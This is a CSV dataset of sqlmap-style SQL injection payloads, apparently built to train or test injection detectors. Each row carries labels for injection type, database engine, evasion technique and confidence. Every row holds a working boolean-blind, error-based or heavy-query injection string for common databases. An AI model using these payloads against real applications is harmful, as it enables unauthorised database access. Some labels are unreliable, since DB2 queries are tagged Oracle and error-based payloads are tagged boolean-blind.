payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
-1219' ) or 5592 = 4835,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as mtda where 3951 = 3951,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 2365 = 2365 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) where 9221 = 9221 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) as qjbd where 2808 = 2808 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
-1890' ) ) ) or 8526 = 1389 and ( ( ( 'ecgt' = 'ecgt,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) where 7026 = 7026,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) and 2006 = 2006",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-1425"" ) where 8056 = 8056 or elt ( 1032 = 1032,3623 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-6076"" ) ) or 8277 = 4757",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as upgb where 2031 = 2031,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' where 6795 = 6795 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
1 ) where 9860 = 9860 and 4443 = 4111--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'omeg' from dual where 4751 = 4751,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
1%' and 7533 = 7533 and '%' = ',boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6561"" ) ) ) or 6872 = 6872 and ( ( ( ""azqp"" like ""azqp",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) ) as mbzk where 9153 = 9153 and 2006 = 2006,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'hcqf' where 9956 = 9956 and ( 2993 = 4297 ) *4297 ) +',boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'gved' from dual where 6965 = 6965,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
-8963 ) where 8528 = 8528 or ( 2470 = 3271 ) *3271--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as kmss where 3214 = 3214 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1 where 5929 = 5929 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-3088' or 6872 = 6872 and 'miwk' = 'miwk,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-1036' ) or 6872 = 6872 and ( 'wvbi' = 'wvbi,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select qdon where 9453 = 9453,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7884"" where 3297 = 3297 or 2492 = 6158",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-3431%' ) or 9323 = 9323#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as zzip where 5353 = 5353 and 3394 = 3092,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-5774' where 3632 = 3632 or ( 3177 = 4222 ) *4222--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as brwj where 9180 = 9180",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-7758%' ) ) ) or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) as dvoy where 7906 = 7906 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) ) and 7533 = 7533 and ( ( ""rnni"" like ""rnni",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
-4557 or 6872 = 6872-- kkte,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-2307' ) ) ) or 6872 = 6872 and ( ( ( 'fyok' like 'fyok,boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as ufba where 4049 = 4049",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 9447 = 9447",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'qsgi' where 1707 = 1707 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as ljhz where 2416 = 2416",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select ohqr where 5610 = 5610,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 where 4641 = 4641,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as zhlf where 4119 = 4119 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1'|| ( select 'ymez' from dual where 9870 = 9870 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
-5962 ) ) as jbqv where 2583 = 2583 or 7496 = 8560--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as tgwp where 9405 = 9405",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as rovd where 3764 = 3764 and elt ( 4249 = 4249,7259 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as msat where 1267 = 1267,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 8506 = 8506,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' where 7036 = 7036,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'goen' from dual where 8586 = 8586,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"1' where 1836 = 1836 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
1' ) ) as mqnv where 9831 = 9831,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) and 3560 = 5467--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as ypgz where 8704 = 8704,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-5726%"" ) ) or 6872 = 6872 and ( ( ""%"" = """,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 1299 = 1299,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"select * from generate_series ( 4592,4592,case when ( 4592 = 4592 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"select * from generate_series ( 4465,4465,case when ( 4465 = 6232 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1'+ ( select 'feof' where 1966 = 1966,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-2291 ) ) or 4067 = 5666#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as rqpp where 9383 = 9383 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 ) ) as xmac where 7692 = 7692,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-8071 ) ) or 9160 = 4253,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) as qaec where 6572 = 6572 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 ) as vbli where 5139 = 5139 and 2782 = 2625--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as xxdm where 4818 = 4818",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as ltco where 3862 = 3862 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-2110' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1' where 9602 = 9602,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select iutk where 6158 = 6158,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" where 5334 = 5334 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) as rqzz where 4987 = 4987 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"-7248' ) where 4626 = 4626 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-9553"" ) as geih where 6453 = 6453 or 8453 = 8159--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-2378"" where 2686 = 2686 or 6872 = 6872--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select qtyi where 7147 = 7147,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'jlon' where 1461 = 1461,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) as kbjt where 2012 = 2012 and ( 5978 = 6898 ) *6898--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-9929' ) as gbtc where 8162 = 8162 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-9558"" where 7497 = 7497 or ( 2539 = 6484 ) *6484--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-1277"" ) where 6622 = 6622 or 3038 = 3038",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 1107 = 1107 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 ) ) as quap where 7625 = 7625,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as njop where 7001 = 7001,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 4633 = 4633 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"-1588%"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) where 1027 = 1027 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
-8410' ) ) ) or 8571 = 8571--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 4844 = 4844,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'ozki' where 4435 = 4435 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) ||'",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" where 3764 = 3764",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-6144' ) or 9385 = 2474--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-7084 ) where 2260 = 2260 or elt ( 1032 = 1032,3623 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 3572 = 3572,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 where 3478 = 3478 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1' where 2332 = 2332 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' where 8128 = 8128,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) as qjjm where 3850 = 3850 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" where 9804 = 9804 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"-6170 ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1%' ) ) ) and 1661 = 7683,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-5903%"" ) ) ) or 3038 = 3038",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as dckd where 1794 = 1794,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) and 4595 = 4595#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 8016 = 8016",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) where 7561 = 7561 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' and 4374 = 2305,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-2100' where 9260 = 9260 or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'mwmn' where 5112 = 5112 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-9845"" ) as xpis where 1936 = 1936 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'xlmt' where 1664 = 1664,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as uycc where 4364 = 4364 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'mdqc' where 4533 = 4533 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) as yyyb where 1705 = 1705 and ( 8770 = 6988 ) *6988--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'+ ( select dyfw where 7743 = 7743 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) +'",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1' ) where 9272 = 9272,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as iubt where 8179 = 8179 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" where 9230 = 9230",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as plgq where 1121 = 1121,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' where 1893 = 1893 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) as ccee where 8880 = 8880 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) where 5698 = 5698 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" ) ) as sdlv where 5922 = 5922 and 2006 = 2006",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-7021' or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) as bfuy where 3879 = 3879 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as fjtv where 8904 = 8904",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select trte where 9173 = 9173 and 2006 = 2006,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' where 4460 = 4460,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-2241 ) where 7606 = 7606 or ( 8459 = 8459 ) *4906--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as saqy where 9704 = 9704 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"-6073"" ) ) ) or 9502 = 2012#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) where 2443 = 2443 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) as qnmd where 5642 = 5642",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) and 7153 = 7474--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-4558' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) where 7950 = 7950 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) where 1793 = 1793",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 8379 = 8379 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-5547' or 9323 = 9323#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-4641"" ) where 4212 = 4212 or make_set ( 3595 = 4062,4062 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select gqez where 3704 = 3704,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) as ycsr where 2238 = 2238 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' where 6116 = 6116,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' where 1623 = 1623,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 2060 = 2060,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-6217 ) ) as hyws where 3441 = 3441 or 9421 = 4695#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 8429 = 8429,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'qylf' where 6984 = 6984 and 2255 = 5094,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as oiqr where 4073 = 4073 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
